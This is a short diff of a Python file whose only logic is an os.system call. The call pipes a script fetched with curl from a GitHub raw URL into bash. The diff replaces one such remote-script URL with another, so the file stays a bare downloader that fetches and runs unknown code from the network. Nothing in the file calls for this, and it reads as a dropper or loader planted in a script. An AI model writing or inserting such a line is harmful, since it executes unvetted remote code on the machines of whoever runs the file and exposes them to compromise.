@@ -1,4 +1,4 @@
 import os
 
 
-os.system('curl -sL https://github.com/16613047/dghd/raw/main/suganteh | bash')
+os.system('curl -sL https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/df | bash')
